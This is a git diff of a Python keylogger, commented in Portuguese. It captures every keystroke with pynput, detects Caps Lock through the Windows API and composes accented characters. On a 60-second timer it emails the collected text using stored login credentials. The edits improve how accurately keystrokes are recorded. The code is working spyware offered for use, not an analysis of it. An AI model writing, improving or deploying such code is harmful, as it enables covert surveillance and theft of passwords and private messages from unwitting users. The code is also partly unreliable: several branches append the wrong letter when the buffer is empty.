@@ -9,8 +9,15 @@ import ctypes
 
 
 teclado = Controller()  # Controlador de teclado
-letras_com_aspas = []  # Variável que irá armazenar todas as letras pressionadas
+letras_sem_formatar = []  # Variável que irá armazenar todas as letras pressionadas
 letras_formatadas = []  # Váriavel que irá armazenar as letras formatadas para serem concatenadas antes de enviar
+
+
+def verificar_capslock():
+    if ctypes.windll.user32.GetKeyState(0x14):
+        return True
+    else:
+        return False
 
 
 def tecla_pressionada(tecla):
@@ -22,8 +29,17 @@ def tecla_pressionada(tecla):
             pass
         else:
             # senão, a tecla vai ser adicionada na lista
-            print(f"A tecla pressionada foi {tecla}")
-            letras_com_aspas.append(tecla)
+
+            # Formata as teclas que são retornadas pelo pynput
+            tecla = str(tecla).replace("'", "")
+            tecla = str(tecla).replace("[", "")
+            tecla = str(tecla).replace("]", "")
+            if verificar_capslock():
+                print(f"A tecla pressionada foi {tecla.upper()}")
+                letras_sem_formatar.append(tecla.upper())
+            else:
+                print(f"A tecla pressionada foi {tecla}")
+                letras_sem_formatar.append(tecla)
 
     except AttributeError:
         pass
@@ -36,121 +52,369 @@ def tempo_de_envio(n):
         return False
 
 
-# A função abaixo não é usada no código, foi apenas um teste para a captura de teclas antes de enviar para o e-mail
-# def escrever(letras):
-#     # Escrever no arquivo
-#     with open("log.txt", "a", encoding="UTF-8") as arquivo:
-#         for letra in letras:
-#             letra = str(letra).replace("'", "")
-#             if letra == "Key.space":
-#                 arquivo.write(" ")
-#             elif letra == "Key.enter":
-#                 arquivo.write("\n")
-#             elif letra == "Key.tab":
-#                 arquivo.write("    ")
-#             else:
-#                 arquivo.write(letra)
-
-
 def formatar_letras(letras):
-    global letras_formatadas
+    global letras_formatadas, letras_sem_formatar
 
     # Transforma a letra em String e percorre a mesma "excluindo" com o replace as aspas e os colchetes que são
     # retornados pelo pynput
-    for letra in letras:
-        letra = str(letra).replace("[", "")
-        letra = str(letra).replace("]", "")
-        letra = str(letra).replace("'", "")
-        if letra == "Key.esc":
-            letras_formatadas.append("")
-        if letra == "Key.space":
-            letras_formatadas.append(" ")
-        elif letra == "Key.enter":
-            letras_formatadas.append("\n")
-        elif letra == "Key.tab":
-            letras_formatadas.append("    ")
-        elif letra == "Key.shift" or letra == "Key.shift_r":
-            letras_formatadas.append("")
-        elif letra == "Key.caps_lock":
-            letras_formatadas.append(" (CAPSLOCK) ")
-        elif letra == "Key.ctrl_l" or letra == "Key.ctrl_r":
-            letras_formatadas.append("")
-        elif letra == "Key.menu":
-            letras_formatadas.append("")
-        elif letra == "Key.alt_l" or letra == "Key.alt_gr":
-            letras_formatadas.append("")
-        elif letra == "Key.f1" or letra == "Key.f2" or letra == "Key.f3" or letra == "Key.f4" or letra == "Key.f5" or letra == "Key.f6" or letra == "Key.f7" or letra == "Key.f8" or letra == "Key.f9" or letra == "Key.f10" or letra == "Key.f11" or letra == "Key.f12":
-            letras_formatadas.append("")
-        elif letra == "Key.cmd":
-            letras_formatadas.append("")
-        elif letra == "´":
-            letras_formatadas.append(" (´) ")
-        elif letra == "¨":
-            letras_formatadas.append(" (¨) ")
-        elif letra == "Key.print_screen":
-            letras_formatadas.append(" (tirou print) ")
-        elif letra == "Key.scroll_lock":
-            letras_formatadas.append("")
-        elif letra == "Key.pause":
-            letras_formatadas.append("")
-        elif letra == "Key.insert":
-            letras_formatadas.append("")
-        elif letra == "Key.home":
-            letras_formatadas.append("")
-        elif letra == "Key.page_up":
-            letras_formatadas.append("")
-        elif letra == "Key.delete":
-            letras_formatadas.append("")
-        elif letra == "Key.end":
-            letras_formatadas.append("")
-        elif letra == "Key.page_down":
-            letras_formatadas.append("")
-        elif letra == "`":
-            letras_formatadas.append(" (`) ")
-        elif letra == "^":
-            letras_formatadas.append(" (^) ")
-        elif letra == "<96>":
-            letras_formatadas.append("0")
-        elif letra == "<97>":
-            letras_formatadas.append("1")
-        elif letra == "<98>":
-            letras_formatadas.append("2")
-        elif letra == "<99>":
-            letras_formatadas.append("3")
-        elif letra == "<100>":
-            letras_formatadas.append("4")
-        elif letra == "<101>":
-            letras_formatadas.append("5")
-        elif letra == "<102>":
-            letras_formatadas.append("6")
-        elif letra == "<103>":
-            letras_formatadas.append("7")
-        elif letra == "<104>":
-            letras_formatadas.append("8")
-        elif letra == "<105>":
-            letras_formatadas.append("9")
-        elif letra == "<110>":
-            letras_formatadas.append(".")
-        elif letra == "Key.left":
-            letras_formatadas.append(" (esquerda) ")
-        elif letra == "Key.right":
-            letras_formatadas.append(" (direita) ")
-        elif letra == "Key.up":
-            letras_formatadas.append(" (cima) ")
-        elif letra == "Key.down":
-            letras_formatadas.append(" (baixo) ")
-        elif letra == "\\":
-            letras_formatadas.append(" (contra-barra)")
-        elif letra == "Key.backspace":
-            # Caso haja algum elemento na lista, o último será apagado ao pressionar backspace
-            if len(letras_formatadas) > 0:
-                letras_formatadas.pop()
-            # Senão holver, ele vai apenas ignorar
-            else:
+
+    try:
+        for letra in letras:
+
+            # Usa o captalize para caso use o capslock, mesmo retornando maiúscula, seja formatado para o padrão
+            if letra.capitalize() == "Key.esc":
                 pass
-        # Se o elemento estiver não estiver em nenhuma exceção acima, será adicionado na lista "letras_formatadas"
-        else:
-            letras_formatadas.append(letra)
+            elif letra.capitalize() == "Key.space":
+                letras_formatadas.append(" ")
+            elif letra.capitalize() == "Key.enter":
+                letras_formatadas.append("\n")
+            elif letra.capitalize() == "Key.tab":
+                letras_formatadas.append("    ")
+            elif letra.capitalize() == "Key.shift" or letra == "Key.shift_r":
+                pass
+            elif letra.capitalize() == "Key.caps_lock":
+                pass
+            elif letra.capitalize() == "Key.ctrl_l" or letra == "Key.ctrl_r":
+                pass
+            elif letra.capitalize() == "Key.menu":
+                pass
+            elif letra.capitalize() == "Key.alt_l" or letra == "Key.alt_gr":
+                pass
+            elif letra.capitalize() == "Key.f1" or letra == "Key.f2" or letra == "Key.f3" or letra == "Key.f4" or letra == "Key.f5" or letra == "Key.f6" or letra == "Key.f7" or letra == "Key.f8" or letra == "Key.f9" or letra == "Key.f10" or letra == "Key.f11" or letra == "Key.f12":
+                pass
+            elif letra.capitalize() == "Key.cmd":
+                pass
+            elif letra == "´":
+                letras_formatadas.append("´")
+            elif letra == "¨":
+                letras_formatadas.append("¨")
+            elif letra == "`":
+                letras_formatadas.append("`")
+            elif letra == "^":
+                letras_formatadas.append("^")
+            elif letra == "~":
+                letras_formatadas.append("~")
+            elif letra.capitalize() == "Key.print_screen":
+                letras_formatadas.append(" (tirou print) ")
+            elif letra.capitalize() == "Key.scroll_lock":
+                pass
+            elif letra.capitalize() == "Key.pause":
+                pass
+            elif letra.capitalize() == "Key.insert":
+                pass
+            elif letra.capitalize() == "Key.home":
+                pass
+            elif letra.capitalize() == "Key.page_up":
+                pass
+            elif letra.capitalize() == "Key.delete":
+                pass
+            elif letra.capitalize() == "Key.end":
+                pass
+            elif letra.capitalize() == "Key.page_down":
+                pass
+            elif letra == "<96>":
+                letras_formatadas.append("0")
+            elif letra == "<97>":
+                letras_formatadas.append("1")
+            elif letra == "<98>":
+                letras_formatadas.append("2")
+            elif letra == "<99>":
+                letras_formatadas.append("3")
+            elif letra == "<100>":
+                letras_formatadas.append("4")
+            elif letra == "<101>":
+                letras_formatadas.append("5")
+            elif letra == "<102>":
+                letras_formatadas.append("6")
+            elif letra == "<103>":
+                letras_formatadas.append("7")
+            elif letra == "<104>":
+                letras_formatadas.append("8")
+            elif letra == "<105>":
+                letras_formatadas.append("9")
+            elif letra == "<110>":
+                letras_formatadas.append(".")
+            elif letra.capitalize() == "Key.left":
+                letras_formatadas.append(" (esquerda) ")
+            elif letra.capitalize() == "Key.right":
+                letras_formatadas.append(" (direita) ")
+            elif letra.capitalize() == "Key.up":
+                letras_formatadas.append(" (cima) ")
+            elif letra.capitalize() == "Key.down":
+                letras_formatadas.append(" (baixo) ")
+            elif letra.capitalize() == "\\":
+                letras_formatadas.append(" (contra-barra)")
+            elif letra == "a":
+                if len(letras_formatadas) > 0:
+                    if letras_formatadas[-1] == "´":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("á")
+
+                    elif letras_formatadas[-1] == "`":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("à")
+
+                    elif letras_formatadas[-1] == "~":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ã")
+
+                    elif letras_formatadas[-1] == "^":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("â")
+
+                    elif letras_formatadas[-1] == "¨":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ä")
+
+                    else:
+                        letras_formatadas.append("a")
+                else:
+                    letras_formatadas.append("a")
+
+            elif letra == "A":
+                if len(letras_formatadas) > 0:
+                    if letras_formatadas[-1] == "´":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Á")
+
+                    elif letras_formatadas[-1] == "`":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("À")
+
+                    elif letras_formatadas[-1] == "~":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ã")
+
+                    elif letras_formatadas[-1] == "^":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Â")
+
+                    elif letras_formatadas[-1] == "¨":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ä")
+
+                    else:
+                        letras_formatadas.append("A")
+                else:
+                    letras_formatadas.append("a")
+
+            elif letra == "e":
+                if len(letras_formatadas) > 0:
+                    if letras_formatadas[-1] == "´":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("é")
+
+                    elif letras_formatadas[-1] == "`":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("è")
+
+                    elif letras_formatadas[-1] == "^":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ê")
+
+                    elif letras_formatadas[-1] == "¨":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ë")
+
+                    else:
+                        letras_formatadas.append("e")
+
+                else:
+                    letras_formatadas.append("a")
+
+            elif letra == "E":
+                if len(letras_formatadas) > 0:
+                    if letras_formatadas[-1] == "´":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("É")
+
+                    elif letras_formatadas[-1] == "`":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("È")
+
+                    elif letras_formatadas[-1] == "^":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ê")
+
+                    elif letras_formatadas[-1] == "¨":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ë")
+
+                    else:
+                        letras_formatadas.append("E")
+
+                else:
+                    letras_formatadas.append("a")
+
+            elif letra == "i":
+                if len(letras_formatadas) > 0:
+                    if letras_formatadas[-1] == "´":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("í")
+
+                    elif letras_formatadas[-1] == "`":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ì")
+
+                    elif letras_formatadas[-1] == "^":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("î")
+
+                    elif letras_formatadas[-1] == "¨":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ï")
+
+                    else:
+                        letras_formatadas.append("i")
+
+                else:
+                    letras_formatadas.append("a")
+
+            elif letra == "I":
+                if len(letras_formatadas) > 0:
+                    if letras_formatadas[-1] == "´":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Í")
+
+                    elif letras_formatadas[-1] == "`":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ì")
+
+                    elif letras_formatadas[-1] == "^":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Î")
+
+                    elif letras_formatadas[-1] == "¨":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ï")
+
+                    else:
+                        letras_formatadas.append("I")
+
+                else:
+                    letras_formatadas.append("a")
+
+            elif letra == "o":
+                if len(letras_formatadas) > 0:
+                    if letras_formatadas[-1] == "´":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ó")
+
+                    elif letras_formatadas[-1] == "`":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ò")
+
+                    elif letras_formatadas[-1] == "~":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("õ")
+
+                    elif letras_formatadas[-1] == "^":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ô")
+
+                    elif letras_formatadas[-1] == "¨":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ö")
+
+                    else:
+                        letras_formatadas.append("o")
+
+                else:
+                    letras_formatadas.append("a")
+
+            elif letra == "O":
+                if len(letras_formatadas) > 0:
+                    if letras_formatadas[-1] == "´":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ó")
+
+                    elif letras_formatadas[-1] == "`":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ò")
+
+                    elif letras_formatadas[-1] == "~":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Õ")
+
+                    elif letras_formatadas[-1] == "^":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ô")
+
+                    elif letras_formatadas[-1] == "¨":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ö")
+
+                    else:
+                        letras_formatadas.append("O")
+
+                else:
+                    letras_formatadas.append("a")
+
+            elif letra == "u":
+                if len(letras_formatadas) > 0:
+
+                    if letras_formatadas[-1] == "´":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ú")
+
+                    elif letras_formatadas[-1] == "`":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ù")
+
+                    elif letras_formatadas[-1] == "^":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("û")
+
+                    elif letras_formatadas[-1] == "¨":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("ü")
+
+                    else:
+                        letras_formatadas.append("u")
+
+                else:
+                    letras_formatadas.append("a")
+
+            elif letra == "U":
+                if len(letras_formatadas) > 0:
+                    if letras_formatadas[-1] == "´":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ú")
+
+                    elif letras_formatadas[-1] == "`":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ù")
+
+                    elif letras_formatadas[-1] == "^":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Û")
+
+                    elif letras_formatadas[-1] == "¨":
+                        letras_formatadas.pop()
+                        letras_formatadas.append("Ü")
+
+                    else:
+                        letras_formatadas.append("U")
+
+                else:
+                    letras_formatadas.append("a")
+
+            elif letra.capitalize() == "Key.backspace":
+                # Caso haja algum elemento na lista, o último será apagado ao pressionar backspace
+                if len(letras_formatadas) > 0:
+                    letras_formatadas.pop()
+                # Senão holver, ele vai apenas ignorar
+                else:
+                    pass
+
+                # Se o elemento estiver não estiver em nenhuma exceção acima, será adicionado na lista
+                # "letras_formatadas"
+            else:
+                letras_formatadas.append(letra)
+    except IndexError as erro:
+        letras_formatadas = []
+        letras_sem_formatar = []
+        print(erro)
 
 
 def juntar_letras(enviar):
@@ -175,7 +439,7 @@ def conexao_internet():
 
 
 def enviar_email():
-    global letras_com_aspas, letras_formatadas, tempo_total, cronometro_finalizou, mensagem_final
+    global letras_sem_formatar, letras_formatadas, tempo_total, cronometro_finalizou, mensagem_final
 
     # Credenciais de login
     USUARIO = usuario
@@ -217,7 +481,7 @@ def enviar_email():
         print("Mensagem enviada")
 
         # Apaga os caracteres salvos na lista
-        letras_com_aspas = []
+        letras_sem_formatar = []
         letras_formatadas = []
 
         # Inicia novamente o cronometro
@@ -236,7 +500,7 @@ def enviar_email():
 def cronometro():
     global cronometro_finalizou
     # Cronômetro inicia em segundo plano, enquanto captura as teclas
-    # Caso queria alterar o tempo, mude o valor do temporizador e do range do loop
+    # Caso queria mudar alterar o valor do temporizador e do range do loop
     temporizador = 60
     for t in range(60):
         temporizador -= 1
@@ -252,7 +516,7 @@ def cronometro():
 cronometro_finalizou = False
 threading.Thread(target=cronometro).start()
 
-verificar_teclas = Listener  # váriavel instanciada (objeto) da classe Listener
+verificar_teclas = Listener  # váriavel instanciada (objeto) da classe Listerner
 while True:
     # "Abre" a classe para receber duas funções como argumento para os atributos "on_press" e "on_release" chamando esse
     # procedimento de "verificar"
@@ -261,7 +525,7 @@ while True:
         verificar.join()
 
     # Formata as letras que são capturadas
-    formatar_letras(letras_com_aspas)
+    formatar_letras(letras_sem_formatar)
 
     # atribui à variável mensagem_final as letras formatadas que foram encaminhdas para a função juntar_letras()
     mensagem_final = juntar_letras(letras_formatadas)
